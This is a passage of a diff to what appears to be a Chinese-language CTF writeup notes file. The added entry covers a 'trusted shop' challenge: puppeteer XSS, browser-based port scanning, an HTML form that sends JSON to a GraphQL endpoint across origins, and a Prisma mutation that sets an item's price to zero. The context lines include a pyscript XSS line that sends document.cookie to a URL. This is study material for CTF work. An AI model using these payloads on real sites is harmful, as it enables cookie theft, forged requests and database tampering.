@@ -2365,3 +2365,22 @@ but.element.innerHTML= ''
 js = sys.modules['pyscr' + 'ipt'].js
 js.fetch("url" + js.document.cookie)
 ```
+242. [trusted shop](https://ctftime.org/writeup/37177)
+- js puppeteer+xss。注意puppeteer基本等于headless chrome，其打开/访问的页面可能会出现xss。反之普通的fetch等访问页面则不会出现。xss的本质是以打开网页的受害者的身份执行js代码，所以可以：
+  - 扫描本机端口。代码参考这篇[帖子](https://www.incolumitas.com/2021/01/10/browser-based-port-scanning/)。wp里有改动后脚本，将测试数量改为10以求更快的速度（虽然可能出现false positive），同时删除并行（parallel）因为题目服务器无法支持并行的多个同时请求。
+  - 发送graphql请求。此处又有一个小技巧：假设网站开启了同源策略（same-origin policy），xss想要发送某些内容到非同源的网站就不能简单使用fetch了，不过可以用form。如果目标网站(比如graphql)只接收json数据该怎么办？如何用html form发送json数据？可以像下面这样：
+    ```html
+    <form name="myForm" id="myForm" action="url" method="POST" enctype="text/plain">
+      <input name='{"variables":{},"' value='":{},"query":"query{findFirstItemOrThrow(where:{id:2}){download}}"}' />
+    </form>
+
+    <script>
+        window.onload = function(){
+        document.forms['myForm'].submit();
+        }
+    </script>
+    ```
+    首先`enctype="text/plain"`保证发送的内容不会被urlencode（graphql不会urldecode），然后利用post传参的特点拼出json：`{"variables":{},"=":{},"query":"..."}`。这个技巧要求目标网站不看请求的Content-Type头，单纯尝试接收类似json的数据。
+- query-engine（graphql）相关。相关源码可在prisma/prisma-engines仓库找到，其中路由信息可在[这里](https://github.com/prisma/prisma-engines/blob/main/query-engine/query-engine/src/server/mod.rs#L48)找到。
+  - query-engine的端口是随机的，在30000到50000之间。
+  - mutation更改数据库中数据的请求。`{"variables":{},"query":"mutation {\n  updateManyItem(data: { price: {set: 0}  }, where: { id: 2 }) { count }}"}`。将id为2的物品价格设为0，当然不同题目的参数不一样。若服务器返回`QueryError(SqliteFailure(Error{ code: ReadOnly, extended_code: 8 }, ...)`，说明背后的数据库不允许当前用户改动数据，readonly。
